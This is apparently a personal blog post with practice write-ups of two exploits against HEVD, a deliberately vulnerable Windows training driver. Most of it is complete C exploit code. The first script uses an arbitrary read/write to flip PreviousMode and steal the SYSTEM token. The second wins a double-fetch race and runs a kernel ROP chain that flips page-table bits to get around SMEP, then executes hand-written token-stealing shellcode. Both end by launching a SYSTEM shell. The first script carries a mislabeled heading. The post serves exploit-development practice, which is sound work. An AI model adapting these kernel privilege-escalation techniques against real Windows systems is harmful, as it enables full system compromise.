---
ID: 20250506012125
date: 2025-05-06
tags:
  - Blogging
  - Windows_Exploitation
Created: 2025-05-06:01:21:00
Last Modified: 2025-05-06:01:21:00
---
![[Pasted image 20250506023658.png]]
# Description

This post documents the high level steps that were taken during this practice. Two challenges were attempted leading to two different exploits. The following two challenges are exploited from Medium Level Integrity :
1. Arbitrary Read and Arbitrary Write 
2. Double Fetch (Race Condition)

Since there are quite a number of writeups on this already, I will not be going into the details but I will just be laying out the exploitation flow as TL;DRs

The exploit scripts can be found from my [GitHub](https://github.com/Owl4444/HEVD_Practice)!
# TL;DR

## Challenge 1 : Arb R/W
1. Get KTHREAD
2. Get EPROCESS
3. Find Token of System
4. Replace current EPROCESS's token with System's
	1. It is the same as the token stealing portion from challenge 2's [[#Exploitation Flow|Exploitation Flow Diagram]]

### Challenge 2 Exploit Script

```c
/////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
/////////////////////////// THIS EXPLOIT IS NOT PERFECT AND IT CONTAINS A THREAD THAT IS ALWAYS LOOPING /////////////////////////////////////
///////////////////////////////////// FROM MEDIUM LEVEL, LEAK KTHREAD, EPROCESS, STEAL TOKEN AND SHELL //////////////////////////////////////
/////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

#include<stdio.h>
#include<Windows.h>
#include<stdint.h>
#include<stdlib.h>
#include "utils.hpp"

#define SYMBOLIC_TARGET L"\\\\.\\HackSysExtremeVulnerableDriver"
#define IOCTL_ARB_WRITE 0x22200B

typedef struct _WRITE_WHAT_WHERE {
	uint64_t What;
	uint64_t Where;
} WRITE_WHAT_WHERE, * PWRITE_WHAT_WHERE;

void kernel_write(HANDLE hHevd, uint64_t what, uint64_t where) {
	WRITE_WHAT_WHERE writeWhatWhere;

	writeWhatWhere.What = (uint64_t)what;
	writeWhatWhere.Where = where;


	DWORD bytesReturned;
	if (DeviceIoControl(hHevd, IOCTL_ARB_WRITE, &writeWhatWhere, sizeof(WRITE_WHAT_WHERE), NULL, 0, &bytesReturned, NULL)) {
	}
	else {
		//printf("[-] Failed to send IOCTL:  0x%x\n", GetLastError());
	}



}

uint64_t kernel_read(HANDLE hHevd, uint64_t where) {
	uint64_t leak = 0;
	BYTE* write_here = (BYTE*)malloc(8);
	if (write_here == NULL) {
		printf("[-] Failed to allocate memory\n");
		CloseHandle(hHevd);
		return -1;
	}
	RtlZeroMemory(write_here, 8);

	kernel_write(hHevd, where, (uint64_t)write_here);
	leak = *(uint64_t*)write_here; // Read the data from the kernel memory


	if (write_here) {
		RtlZeroMemory(write_here, 8);
		free(write_here);
	}
	return leak;
}

int main(int argc, char** argv) {

	HANDLE hHevd = CreateFileW(SYMBOLIC_TARGET, GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
	if (hHevd == INVALID_HANDLE_VALUE) {
		printf("[-] Failed to open device handle\n");
		return -1;
	}
	printf("[+] Device handle opened successfully\n");


	/****************************** FLIPPING PREVIOUS MODE TO 0 ***********************************/
	PVOID KTHREAD_ADDRESS = getKTHREAD();
	printf("[+] KTHREAD address: %p\n", KTHREAD_ADDRESS);
	BYTE* previous_mode_address = (BYTE*)((ULONGLONG)(ULONG_PTR)KTHREAD_ADDRESS + 0x232); 
	uint64_t previous_mode_64 = kernel_read(hHevd, (uint64_t)previous_mode_address);
	printf("[+] Previous mode address: %p\n", previous_mode_address);
	printf("[+] Previous mode value: 0x%llx\n", previous_mode_64);
	previous_mode_64 ^= 0x1; // Flip the previous mode value



	uint64_t* what = (uint64_t*)malloc(sizeof(uint64_t));
	*what = previous_mode_64;
	kernel_write(hHevd, (uint64_t)what, (uint64_t)(ULONG_PTR)previous_mode_address);
	printf("[+] Previous mode value flipped successfully\n");
	Sleep(1000);


	_NtWriteVirtualMemory NtWriteVirtualMemory = (_NtWriteVirtualMemory)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtWriteVirtualMemory");
	if (!NtWriteVirtualMemory) {
		printf("[-] Failed to get NtWriteVirtualMemory address\n");
		CloseHandle(hHevd);
		return -1;
	}
	printf("[+] NtWriteVirtualMemory address: %p\n", NtWriteVirtualMemory);


	NtWriteVirtualMemory(GetCurrentProcess(), (PVOID)0xFFFFF78000000800, (PVOID)"ABABABAB", 8, NULL);


	
	LPVOID nt_base = GetBaseAddr(L"ntoskrnl.exe");
	LPVOID hevd_base = GetBaseAddr(L"HEVD.sys");

	printf("[+] ntoskrnl.exe base address: %p\n", nt_base);
	printf("[+] hevd.sys base address: %p\n", hevd_base);

	uint64_t offset_to_EPROCESS_from_kthread = 0x220;
	uint64_t offset_to_pid_eprocess = 0x440;
	uint64_t offset_to_activeProcessLinks_eprocess = 0x448;
	uint64_t offset_to_token_eprocess = 0x4b8;


	// Offset to EPROCESS from KTHREAD
	uint64_t eprocess_address = (uint64_t)KTHREAD_ADDRESS + offset_to_EPROCESS_from_kthread;
	
	uint64_t EPROCESS = kernel_read(hHevd, eprocess_address);
	uint64_t current_eprocess = EPROCESS;

	printf("[+] EPROCESS address: 0x%llx\n", EPROCESS);
	uint64_t pid = kernel_read(hHevd, EPROCESS + offset_to_pid_eprocess);

	while (pid != 4) {
		printf("[*] Reading EPROCESS @ 0x%llx\n", EPROCESS + offset_to_activeProcessLinks_eprocess);
		ReadProcessMemory(
			GetCurrentProcess(), 
			(PVOID)(EPROCESS + offset_to_activeProcessLinks_eprocess),
			&EPROCESS, 
			sizeof(uint64_t), 
			NULL
		);
		EPROCESS -= offset_to_activeProcessLinks_eprocess;
		
		pid = kernel_read(hHevd, EPROCESS + offset_to_pid_eprocess);

	}

	printf("[+] PID for SYSTEM found!\n");
	printf("[*] EPROCESS of SYSTEM : 0x%llx\n", EPROCESS);


	uint64_t SYSTEM_TOKEN_ADDRESS = EPROCESS + offset_to_token_eprocess;
	uint64_t SYSTEM_TOKEN_VALUE = kernel_read(hHevd, SYSTEM_TOKEN_ADDRESS);
	printf("[+] SYSTEM token address: 0x%llx\n", SYSTEM_TOKEN_ADDRESS);
	printf("[+] SYSTEM token value: 0x%llx\n", SYSTEM_TOKEN_VALUE);

	uint64_t current_token_address = current_eprocess + offset_to_token_eprocess;
	uint64_t current_token_value = kernel_read(hHevd, current_token_address);
	printf("[+] Current token address: 0x%llx\n", current_token_address);
	printf("[+] Current token value : 0x%llx\n", current_token_value);

	NtWriteVirtualMemory(GetCurrentProcess(), (PVOID)current_token_address, (PVOID)&SYSTEM_TOKEN_VALUE, 8, NULL);
	printf("[+] Current token value changed to SYSTEM token value\n");

	Sleep(1000);

	previous_mode_64 ^= 0x1; // Flip the previous mode value back to original
	uint64_t* what_ = (uint64_t*)malloc(sizeof(uint64_t));
	*what_ = previous_mode_64;
	NtWriteVirtualMemory(GetCurrentProcess(), (PVOID)previous_mode_address, (PVOID)what_, 8, NULL);
	system("cmd.exe");

	
	return -1;
}
```
## Challenge 2 : Double Fetch

There are at least two ways to do it but I chose to put shellcode for System Token Stealing into user-mode buffer. After exploiting the vulnerability, the thread should run our user-mode shellcode after bypassing SMAP/SMEP. 
1. Create two threads
	- Thread1 : Constantly flipping the size of buffer between valid and invalid size
	- Thread2 : Constantly sending valid sized buffer 
2. Once race is won, size should be corrupted due to double fetch leading to kernel stack overflow
3. ROP chain to :
	- flip user-mode shellcode PTE's U/S bit to kernel
	- flip user-mode shellcode PTE's EXB from 1 to 0
	- flip user-mode shellcode PXE's EXB from 1 to 0
	- ret to user-mode shellcode buffer
- User-mode shellcode would then steal the Token similar to challenge 1

A shoutout to Milton (@wetw0rk) for his encouragement and to his [POC](https://github.com/wetw0rk/Exploit-Development/blob/master/HEVD-Exploits/0x05%20-%20Race%20Condition%20\(Double%20Fetch\)/Windows%2011%20\(x64\)/poc.c)for ideas that I can build upon. The only thing I needed to add on was the `EXB` bit flipping for `PXE` and `PTE`. As a disclaimer, I am not able to terminate thread by recovering safely without BSOD due to the fact that I have flipped the EXB bit. So, I have decided to continue to let this thread to become a dummy by doing infinite loop instead.

![[Pasted image 20250506022713.png]]
### Exploitation Flow Diagram

![[DoubleFetch ExploitationFlow.png]]

### Difficulties Faced

#### Access Violation (SOLVED)

The following showed one of the problems that I have faced. This is due to EXB not being unset in the PXE at least in the ROP chain.

![[Pasted image 20250506023005.png]]

#### Flipped PXE value (UNSOLVED)

`0x8000000000000000` from `8a0000000a328867` was xor'd to unset EXB. However, if we use the shellcode to set it back, the system would get access error. Currently unsure of how to solve this issue. The idea (@wetw0rk 's exploit) was able to run shellcode without the need to flip EXB bit and was able to recovery gracefully by storing registers from the `_TRAP_FRAME` before `swapgs` and `sysretq`.
```
MEMORY_MANAGEMENT (1a) 
	# Any other values for parameter 1 must be individually examined. 
Arguments: 
Arg1: 0000000000003600, The subtype of the BugCheck. 
Arg2: fffff8fc7e3f1000 
Arg3: 0a0000000a328867 
Arg4: 8a0000000a328867  
Debugging Details: ------------------
```

Because of that, my shellcode is set to run in an infinite loop. Therefore, I am unable to terminate this thread which led to the process not exiting even though I have tried `exit(0)` in my code. Note that the following figure shows a three threads when in fact, we could win the race with just 1 thread each (1 to constantly flip bit and 1 to constantly send ioctl request).

![[Pasted image 20250506022749.png]]

### Challenge 2 Exploit Script

```c
/////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
/////////////////////////// THIS EXPLOIT IS NOT PERFECT AND IT CONTAINS A THREAD THAT IS ALWAYS LOOPING /////////////////////////////////////
////////////////////// CURRENTLY STILL TRYING TO FIND WAYS TO EXIT OUT OF THAT THREAD GRACEFULLY WITHOUT CAUSING BSOD ///////////////////////
/////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

#include<stdio.h>
#include<Windows.h>
#include<stdint.h>
#include<stdlib.h>
#include <psapi.h>
#include "utils.hpp"

#define NUM_THREADS 3

typedef struct _DOUBLE_FETCH {
	uint64_t Buffer;
	uint64_t Size;
} DOUBLE_FETCH, * PDOUBLE_FETCH;


#define SYMBOLIC_TARGET L"\\\\.\\HackSysExtremeVulnerableDriver"
#define IOCTL_DEOUBLEFETCH 0x222037
#define SAFE_SIZE 0x7FF // for double fetching

#define OVERFLOW_SIZE 0x958
/*
	2: kd> ?nt!MiPteInShadowRange-nt
	Evaluate expression: 3273152 = 00000000`0031f1c0
*/
#define OFFSET_TO_MIPTEINSHADOWRANGE 0x031f1c0
bool bContinueRace = TRUE;

HANDLE hHevd = NULL; // Handle to the device
DOUBLE_FETCH doubleFetch;  // to mess with this

HANDLE hThreads[NUM_THREADS] = { 0 };
HANDLE hThreadsRace[NUM_THREADS] = { 0 };
HANDLE g_hShutdownEvent = NULL;

PVOID kthread_kernel[NUM_THREADS] = { 0 };
BOOL is_system = FALSE;

bool g_killthreads = FALSE;

LPVOID nt_base;


/////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
/////////////////////////////// GADGET OFFSETS (MAY CONTAIN OFFSETS THAT ARE NOT USED IN THIS EXPLOIT ///////////////////////////////////////
/////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

ULONGLONG pop_rax_offset = 0x05dafc4;    // bp hevd+0x05dafc4
// 5cf406: pop rdi ; pop rbx ; ret ; (59 found)
ULONGLONG pop_rdi_pop_rbx_offset = 0x5cf406; // bp hevd+0x5cf406
// 51ccd7: add r8, rax ; mov rax, r8 ; ret ;
ULONGLONG add_r8_rax_mov_rax_r8_offset = 0x51ccd7; // bp hevd+0x51ccd7
// 0x089b429: pop r8 ; ret ; (5 found)
ULONGLONG pop_r8_offset = 0x089b429; // bp hevd+0x089b429
// 0x0873abc: mov qword [r8], rax ; ret ; (13 found)
ULONGLONG mov_qword_r8_rax_offset = 0x0873abc; // bp hevd+0x0873abc
// 0x09bffb6: mov rax, qword [rax] ; ret ; (7 found)
ULONGLONG mov_rax_qword_rax_offset = 0x09bffb6; // bp hevd+0x09bffb6
// 0x05c7289: pop rbx ; ret ; (3319 found)
ULONGLONG pop_rbx_offset = 0x05c7289; // bp hevd+0x05c7289
// 0x062c459: push rbx ; ret ; (10 found)
ULONGLONG push_rbx_offset = 0x062c459; // bp hevd+0x062c459
// 0x029b5ea: sub rax, r8 ; ret ; (2 found)
ULONGLONG sub_rax_r8_offset = 0x29b5ea; // bp hevd+0x029b5ea
// 0x5d0268: call rax ; (68 found)
ULONGLONG call_rax_offset = 0x5d0268; // bp hevd+0x5d0268
// 05ce0fe: push rax ; ret ; (22 found)
ULONGLONG push_rax_offset = 0x05ce0fe; // bp hevd+0x05ce0fe
// 05cd043: pop rcx ; ret ; (90 found)
ULONGLONG pop_rcx_offset = 0x05cd043; // bp hevd+0x05cd043
// 0x06b2bb0: pop rdx ; ret ; (5 found)
ULONGLONG pop_rdx_offset = 0x06b2bb0; // bp hevd+0x06b2bb0
// 0x02d9250: xor qword [rdx], rax ; ret ; (1 found)
ULONGLONG xor_qword_rdx_rax_offset = 0x02d9250; // bp hevd+0x02d9250
//0x051befb: int3 ; add rsp, 0x20 ; pop rbx ; ret ; (2 found)
ULONGLONG int3_offset = 0x051befb; // bp hevd+0x051befb
// 0x5d8931: mov rax, rdx ; ret ; (32 found)
ULONGLONG mov_rax_rdx_offset = 0x5d8931;
//0x24f803: xor qword [r8+0x08], rcx ; mov rbx, qword [rsp+0x08] ; mov rdi, qword [rsp+0x10] ; ret ; (1 found)
ULONGLONG xor_qword_r8_sub_8_rcx_offset = 0x24f803; // bp hevd+0x24f803
//0x59ac55: mov r8, rax; mov rax, r8; add rsp, 0x28; ret; (1 found)
ULONGLONG mov_r8_rax_mov_rax_r8_add_rsp_28_offset = 0x59ac55; // bp hevd+0x59ac55
// 0x24f803: xor qword [r8+0x08], rcx ; mov rbx, qword [rsp+0x08] ; mov rdi, qword [rsp+0x10] ; ret ; (1 found)
ULONGLONG xor_qword_r8_plus_8__rcx_offset = 0x24f803; // bp hevd+0x24f803
// 0x023558e: mov rdx, rax ; mov rax, rdx ; mov rbx, qword [rsp+0x40] ; add rsp, 0x30 ; pop rdi ; ret ; (1 found)
ULONGLONG mov_rdx_rax_mov_rax_rdx_mov_rbx_rsp_40_add_rsp_30_pop_rdi_offset = 0x23558e; // bp hevd+0x023558e


ULONGLONG nt_migetpteaddress_offset = 0x0332728;

ULONGLONG pop_rax;
ULONGLONG pop_rdi_pop_rbx;
ULONGLONG add_r8_rax_mov_rax_r8;
ULONGLONG pop_r8;
ULONGLONG mov_qword_r8_rax;
ULONGLONG mov_rax_qword_rax;
ULONGLONG pop_rbx;
ULONGLONG push_rbx;
ULONGLONG sub_rax_r8;
ULONGLONG call_rax;
ULONGLONG push_rax;
ULONGLONG pop_rcx;
ULONGLONG nt_migetpteaddress;
ULONGLONG pop_rdx;
ULONGLONG xor_qword_rdx_rax;
ULONGLONG int3;
ULONGLONG mov_rax_rdx;
ULONGLONG xor_qword_r8_sub_8_rcx;
ULONGLONG mov_r8_rax_mov_rax_r8_add_rsp_28;
ULONGLONG xor_qword_r8_plus_8__rcx;
ULONGLONG mov_rdx_rax_mov_rax_rdx_mov_rbx_rsp_40_add_rsp_30_pop_rdi;

ULONGLONG shellcode_address;
ULONGLONG MiPteInShadowRange_fptr;
ULONGLONG pxe_address;


/////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
/////////////////////////////// CONSTANT FLIPPING OF SIZE IN ATTEMPT TO WIN THE RACE WITH SHORT SLEEP ///////////////////////////////////////
/////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
unsigned long __stdcall RaceThread1(void* lpParameter) {
	printf("Starting RaceThread1\n");
	while (WaitForSingleObject(g_hShutdownEvent,0) != WAIT_OBJECT_0) {
		//printf("Changing size ...\n");
		doubleFetch.Size = OVERFLOW_SIZE;
		Sleep(0.1);
		doubleFetch.Size = SAFE_SIZE;
		Sleep(0.1);
	}
	return 0;
}

/////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
/////////////////// SENDING THE IOCTL IN HOPE TO WIN THE RACE. ROP CHAIN IS GENERATED BEFORE LOOPING  ///////////////////////////////////////
/////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
unsigned long __stdcall RaceThread2(void* lpParameter) {
	printf("Starting RaceThread2\n");
	// lpParams stores the index of the thread

	/////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
  ///////////////////////////////////////// GADGETS LISTED HERE MAY OR MAY NOT BE USED IN THE EXPLOIT  ////////////////////////////////////////
  /////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
  
	pop_rax = (ULONGLONG)nt_base + pop_rax_offset;
	pop_rdi_pop_rbx = (ULONGLONG)nt_base + pop_rdi_pop_rbx_offset;
	add_r8_rax_mov_rax_r8 = (ULONGLONG)nt_base + add_r8_rax_mov_rax_r8_offset;
	pop_r8 = (ULONGLONG)nt_base + pop_r8_offset;
	mov_qword_r8_rax = (ULONGLONG)nt_base + mov_qword_r8_rax_offset;
	mov_rax_qword_rax = (ULONGLONG)nt_base + mov_rax_qword_rax_offset;
	pop_rbx = (ULONGLONG)nt_base + pop_rbx_offset;
	sub_rax_r8 = (ULONGLONG)nt_base + sub_rax_r8_offset;
	call_rax = (ULONGLONG)nt_base + call_rax_offset;
	push_rax = (ULONGLONG)nt_base + push_rax_offset;
	pop_rcx = (ULONGLONG)nt_base + pop_rcx_offset;
	nt_migetpteaddress = (ULONGLONG)nt_base + nt_migetpteaddress_offset; // address of nt_migetpteaddress
	pop_rdx = (ULONGLONG)nt_base + pop_rdx_offset; // address of nt_migetpteaddress
	xor_qword_rdx_rax = (ULONGLONG)nt_base + xor_qword_rdx_rax_offset; 
	mov_rax_rdx = (ULONGLONG)nt_base + mov_rax_rdx_offset;
	xor_qword_r8_sub_8_rcx = (ULONGLONG)nt_base + xor_qword_r8_sub_8_rcx_offset; // address of nt_migetpteaddress
	mov_r8_rax_mov_rax_r8_add_rsp_28 = (ULONGLONG)nt_base + mov_r8_rax_mov_rax_r8_add_rsp_28_offset; // address of nt_migetpteaddress
	sub_rax_r8 = (ULONGLONG)nt_base + sub_rax_r8_offset; // address of nt_migetpteaddress
	xor_qword_r8_plus_8__rcx = (ULONGLONG)nt_base + xor_qword_r8_plus_8__rcx_offset; // address of nt_migetpteaddress
	mov_rdx_rax_mov_rax_rdx_mov_rbx_rsp_40_add_rsp_30_pop_rdi = (ULONGLONG)nt_base + mov_rdx_rax_mov_rax_rdx_mov_rbx_rsp_40_add_rsp_30_pop_rdi_offset; // address of nt_migetpteaddress


	/*
	* 
	* GETTING PXE VALUE
		2: kd> dqs nt!MiPteInShadowRange+2 l1
		fffff807`46d1f1c2  ffff8c46`23118000

		2: kd> !pte 0x44444000
										   VA 0000000044444000
		PXE at [[[[[[[[>>>>>>> FFFF8C4623118000 <<<<<<<<]]]]]]   PPE at FFFF8C4623000008    PDE at FFFF8C4600001110    PTE at FFFF8C0000222220
		contains 8A0000000509D867  contains 0A00000004E9E867  contains 0000000000000000
		pfn 509d      ---DA--UW-V  pfn 4e9e      ---DA--UWEV  contains 0000000000000000
		not valid

	*/

	////////////////////// ADDRESSES TO GADGETS ////////////////////////
	///////////////////// FLIP U/S BIT FROM PTE ////////////////////////
	/////////////////// FLIP EXB FROM PTE AND PXE //////////////////////
	/////////////////// JUMP TO USERMODE SHELLCODE /////////////////////
	ULONGLONG ROP_GADGETS[] = {
		pop_rax,								// this is to offset r8+8 later by subtracting 8 first
		8,										// rax = 8
		mov_r8_rax_mov_rax_r8_add_rsp_28,      // mov r8, rax ; mov rax, r8 ; add rsp, 0x28 ; ret ; // this is to offset r8+8 later by subtracting 8 first
		0,0,0,0,0,								// make up for the add rsp, 0x28. 
		// r8 should be 8
		pop_rcx,								// pop rcx
		shellcode_address,						// address of shellcode
		//pop_rax, 
		nt_migetpteaddress,						// address of nt_migetpteaddress
		// r8 = 8, rax = pte address of shellcode
		pop_rcx,								// to xor with 1 << 3 (bit 3) to flip u/s
		4,										// // r8 = 8, rax = pte address of shellcode, rcx = 4
		mov_rdx_rax_mov_rax_rdx_mov_rbx_rsp_40_add_rsp_30_pop_rdi, // mov rdx, rax ; mov rax, rdx ; mov rbx, qword [rsp+0x40] ; add rsp, 0x30 ; pop rdi ; ret ; (1 found)
		//rax = pte address of shellcode, rdx = pte address of shellcode
		// rbx corrupted, rdi corrupted
		//  hevd+0x023558e
		0x5555555555555555, 0x5555555555555555, 0x5555555555555555, 0x5555555555555555, 0x5555555555555555,
		0x5555555555555555, 0x7777777777777777,		
		pop_rax,								// pop rax
		4,										// value to xor
		// rax = 4, rdx = pte address of shellcode
		xor_qword_rdx_rax,					// xor qword [rdx], rax ; ret ; // xor the pte address with 4
		// FLIP THE FREAKING EXB for PTE 
		pop_rax, 
		0x8000000000000000,
		xor_qword_rdx_rax,
		// FLIP THE FREAKING EXB for PML4
		pop_rax, 
		pxe_address,
		mov_rax_qword_rax,						// mov rax, qword [rax] ; ret ; // rax in the end contains pxe address
		mov_rdx_rax_mov_rax_rdx_mov_rbx_rsp_40_add_rsp_30_pop_rdi, // mov rdx, rax ; mov rax, rdx ; mov rbx, qword [rsp+0x40] ; add rsp, 0x30 ; pop rdi ; ret ; (1 found)
														//rax = pxe address,
		0x6666666666666666, 0x6666666666666666, 0x6666666666666666, 0x6666666666666666, 0x6666666666666666,
		0x6666666666666666, 0x8888888888888888,
		pop_rax,
		0x8000000000000000,   // EXB for PML4/PXE
		xor_qword_rdx_rax,
		shellcode_address,
	};

	PVOID userbuffer = NULL; // buffer to use for double fetch
	//userbuffer = (PVOID)malloc(SAFE_SIZE);
	userbuffer = (PVOID)VirtualAlloc(NULL, OVERFLOW_SIZE + 8, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE | PAGE_NOCACHE);
	if (userbuffer == NULL) {
		printf("[-] Failed to allocate memory\n");
		CloseHandle(hHevd);
		return -1;
	}
	memset(userbuffer, 0x41, SAFE_SIZE + 8); // Fill the buffer with 'A's
	doubleFetch.Buffer = (uint64_t)userbuffer;
	
	memcpy((PVOID)(ULONG_PTR)((ULONGLONG)userbuffer + 0x808), ROP_GADGETS, sizeof(ROP_GADGETS)); // Copy the ROP gadgets into the buffer
	int counter = 0;
	while (WaitForSingleObject(g_hShutdownEvent, 0) != WAIT_OBJECT_0) {
		doubleFetch.Size = SAFE_SIZE;
		DeviceIoControl(hHevd, IOCTL_DEOUBLEFETCH, &doubleFetch, sizeof(doubleFetch), NULL, 0, NULL, NULL);

		counter++;
		if (counter % 10000 == 0) {
			if (IsRunningAsSystem()) {
				g_killthreads = TRUE;
				SetEvent(g_hShutdownEvent); // ATTEMPT TO TRIGGER THREADS TO SHUTDOWN BUT WILL NOT TERMINATE THIS BECAUSE OF INFINITE LOOP AT THIS POINT
				break;
			}
		}

	}
	
	if(userbuffer) VirtualFree(userbuffer, 0, MEM_RELEASE);
	printf("ENDING THREAD 2\n");
	return 0;
}


int main() {

	g_hShutdownEvent = CreateEvent(NULL, TRUE, FALSE, NULL);
	if (g_hShutdownEvent == NULL) {
		printf("[-] Failed to create shutdown event\n");
		return -1;
	}

	shellcode_address = (ULONGLONG)VirtualAlloc(
									(PVOID)0x44444000, 
									0x1000, 
									MEM_COMMIT | MEM_RESERVE, 
									PAGE_READWRITE
								);
	if (shellcode_address == NULL) {
		printf("[-] Failed to allocate memory for shellcode\n");
		return -1;
	}
	VirtualLock((LPVOID)shellcode_address, 0x1000);
	memset((PVOID)shellcode_address, 0x90, 0x1000); // Fill the shellcode with NOPs

	
	/*
	Shellcode for token stealing
		
		xor rax, rax
		mov    rax,QWORD PTR gs:[rax+0x188]
		mov    rax,QWORD PTR [rax+0xb8]
		mov    r8,rax

		parse_eproc:
			mov    rax,QWORD PTR [rax+0x448]
			sub    rax,0x448
			mov    rcx,QWORD PTR [rax+0x440]
			cmp    rcx,0x4
			jne    parse_eproc

		steal_token:
			mov    r9,QWORD PTR [rax+0x4b8]
			mov    QWORD PTR [r8+0x4b8],r9

			xor rax, rax
		loopy:
			rep nop
			jmp loopy




   
	*/
	BYTE shellcodebytes[] = { 0x48, 0x31, 0xC0, 0x65, 0x48, 0x8B, 0x80, 0x88, 0x01, 0x00, 0x00, 0x48, 0x8B, 0x80, 0xB8, 0x00, 0x00, 0x00, 0x49, 0x89, 0xC0, 0x48, 0x8B, 0x80, 0x48, 0x04, 0x00, 0x00, 0x48, 0x2D, 0x48, 0x04, 0x00, 0x00, 0x48, 0x8B, 0x88, 0x40, 0x04, 0x00, 0x00, 0x48, 0x83, 0xF9, 0x04, 0x75, 0xE6, 0x4C, 0x8B, 0x88, 0xB8, 0x04, 0x00, 0x00, 0x4D, 0x89, 0x88, 0xB8, 0x04, 0x00, 0x00, 0x48, 0x31, 0xC0, 0xF3, 0x90, 0xEB };

	memcpy((PVOID)((PBYTE)shellcode_address ), shellcodebytes, sizeof(shellcodebytes)); // Copy the shellcode into the buffer





	printf("Address of shellcode address : 0x%llx\n", shellcode_address);

	nt_base = (LPVOID)GetBaseAddr(L"ntoskrnl.exe");
	printf("[+] ntoskrnl.exe base address for ROP chain : 0x%llx\n", nt_base);

	MiPteInShadowRange_fptr = (ULONGLONG)nt_base + OFFSET_TO_MIPTEINSHADOWRANGE; // address of MiPteInShadowRange
	pxe_address = MiPteInShadowRange_fptr + 0x2; // address of pxe_address
	printf("[+] MiPteInShadowRange address : 0x%llx\n", MiPteInShadowRange_fptr);
	//debug("Set breakpoint first please\n");



	PVOID kThread = getKTHREAD();
	printf("[+] kThread address : 0x%llx\n", kThread);



	hHevd = CreateFileW(SYMBOLIC_TARGET, GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
	if (hHevd == INVALID_HANDLE_VALUE) {
		printf("[-] Failed to open device handle\n");
		return -1;
	}
	printf("[+] Opened device handle successfully\n");


	printf("[*] Beginnging to race for double fetch\n");

	EmptyWorkingSet(GetCurrentProcess());
	YieldProcessor();



	for (int i = 0; i < NUM_THREADS; i++) {
		hThreads[i] = CreateThread(NULL, 0x1000, RaceThread1, NULL, 0, NULL);
		if (hThreads[i] == NULL) {
			printf("[-] Failed to create thread 1\n");
			CloseHandle(hHevd);
			return -1;
		}

		SetThreadAffinityMask(hThreads[i], 0);

		
		hThreadsRace[i] = CreateThread(NULL, 0x1000, RaceThread2, NULL, 0, NULL);
		if (hThreads[i] == NULL) {
			printf("[-] Failed to create thread 2\n");
			CloseHandle(hHevd);
			return -1;
		}

		SetThreadAffinityMask(hThreads[i], 1);
	}

	printf("Starting race...\n");
	BOOL isSystem = FALSE;
	while (!isSystem) {
		Sleep(1000); // Check once per second
		isSystem = IsRunningAsSystem();
		if (isSystem) {
			printf("[+] SYSTEM token stolen successfully!\n");
			g_killthreads = TRUE;
			printf("SEtting event...\n");
			SetEvent(g_hShutdownEvent);
			break;
		}
	}

	// Wait for threads to exit
	printf("[*] Waiting for threads to terminate cleanly...\n");



	WaitForMultipleObjects(NUM_THREADS, hThreads, TRUE, INFINITE);  
  // Did not attempt to terminate since it will be blocked as shellcode is keeping it in infiniteloop and yielding CPU with pause instruction
	printf("[*] Forcefully termianting all threads...\n");

	for (int i = 0; i < NUM_THREADS; i++) {
		if (hThreads[i] != NULL) {
			DWORD exitCode = 0;
			if (GetExitCodeThread(hThreads[i], &exitCode) && exitCode == STILL_ACTIVE) {
				printf("[*] Thread 1 #%d still active, terminating...\n", i);
				TerminateThread(hThreads[i], 0);
			}
			CloseHandle(hThreads[i]);
			hThreads[i] = NULL;
		}

		if (hThreadsRace[i] != NULL) {
			DWORD exitCode = 0;
			if (GetExitCodeThread(hThreadsRace[i], &exitCode) && exitCode == STILL_ACTIVE) {
				printf("[*] Thread 2 #%d still active, terminating...\n", i);
			}
			CloseHandle(hThreadsRace[i]);
			hThreadsRace[i] = NULL;
		}
	}

	// Launch the command prompt
	printf("[+] Starting a SYSTEM shell...\n");
	shell();
	printf("Exiting...\n");
	exit(0);
	// Close the device handle
	if (hHevd != INVALID_HANDLE_VALUE && hHevd != NULL) {
		CloseHandle(hHevd);
		hHevd = NULL;
	}
	// Free shellcode memory
	if (shellcode_address) {
		VirtualFree((PVOID)shellcode_address, 0, MEM_RELEASE);
	}


}
```

# Conclusion

This two challenges were useful as an exercise to practice ROP Chaining and stealing token! Super fun and thanks for @blastitboy and @wetw0rk for the encouragement and motivation!